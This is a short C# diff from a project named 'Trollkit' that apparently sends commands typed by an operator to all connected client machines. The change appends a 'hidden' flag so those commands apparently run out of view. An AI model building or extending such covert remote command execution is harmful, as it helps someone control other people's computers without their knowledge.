@@ -39,7 +39,7 @@ namespace Trollkit
 
         private void BtnGo_Click(object sender, RoutedEventArgs e)
         {
-            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = Handler, Value = TbComammand.Text};
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = Handler, Value = $"{TbComammand.Text},hidden"};
             ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
 
